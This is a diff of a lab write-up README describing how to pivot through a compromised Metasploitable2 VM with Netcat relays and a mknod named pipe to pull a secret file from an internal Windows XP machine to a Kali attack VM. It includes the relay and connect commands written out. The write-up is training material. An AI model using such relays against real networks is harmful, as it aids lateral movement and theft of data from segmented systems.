@@ -1,31 +1,42 @@
 # PROJECTNAME
-
+Pivoting with Relays
 ## Objective
-[Brief Objective - Remove this afterwards]
 
-The Detection Lab project aimed to establish a controlled environment for simulating and detecting cyber attacks. The primary focus was to ingest and analyze logs within a Security Information and Event Management (SIEM) system, generating test telemetry to mimic real-world attack scenarios. This hands-on experience was designed to deepen understanding of network security, attack patterns, and defensive strategies.
+This lab focused on demonstrating how to pivot through a compromised system using Netcat relays. Simulating a real-world cyberattack, the task was to access a Windows XP machine hidden within a private network by relaying traffic through a compromised Metasploitable2 (MS2) VM from an external Kali Linux attack VM. This exercise helped reinforce the concepts of port forwarding, named pipes, and relay setups, commonly used in red teaming and post-exploitation activities.
 
 ### Skills Learned
-[Bullet Points - Remove this afterwards]
 
-- Advanced understanding of SIEM concepts and practical application.
-- Proficiency in analyzing and interpreting network logs.
-- Ability to generate and recognize attack signatures and patterns.
-- Enhanced knowledge of network protocols and security vulnerabilities.
-- Development of critical thinking and problem-solving skills in cybersecurity.
+- Understanding pivoting techniques in segmented network environments
+
+- Setting up and managing Netcat listeners and relays
+
+- Redirecting file contents across virtual machines securely
+
+- Using named pipes to create forward relays in Linux
+
+- Practicing secure information delivery across isolated networks
 
 ### Tools Used
-[Bullet Points - Remove this afterwards]
 
-- Security Information and Event Management (SIEM) system for log ingestion and analysis.
-- Network analysis tools (such as Wireshark) for capturing and examining network traffic.
-- Telemetry generation tools to create realistic network traffic and attack scenarios.
+-Netcat (ncat-portable-5.59BETA1) – Lightweight networking utility
+
+- MS2 (Metasploitable2) – Intermediate pivot host
+
+- Windows XP VM – Internal target system
+
+- Kali Linux – External attacker system
+
+- mknod, nc, ftp, and basic shell commands for relay setup and file transfers
 
 ## Steps
-drag & drop screenshots here or use imgur and reference them using imgsrc
+Ref 1: Windows XP — Netcat Listener Setup
 
-Every screenshot should have some text explaining what the screenshot is about.
+Screenshot showing the name of the Windows XP VM and the command that redirects the contents of super_secret_file.txt into Netcat (port 8080).
 
-Example below.
+Ref 2: MS2 — Netcat Forward Relay
 
-*Ref 1: Network Diagram*
+Screenshot showing the name of the MS2 VM, the mknod pipe setup, the Netcat relay command (e.g., nc -nlvp 2222 < mypipe | nc <XP-IP> 8080) and an active connection forwarding the file to Kali.
+
+Ref 3: Kali — Receiving the Secret Formula
+
+Screenshot showing the command used on Kali to connect to the MS2 relay (nc <MS2-IP> 2222) and display of the secret contents from the Windows XP file.
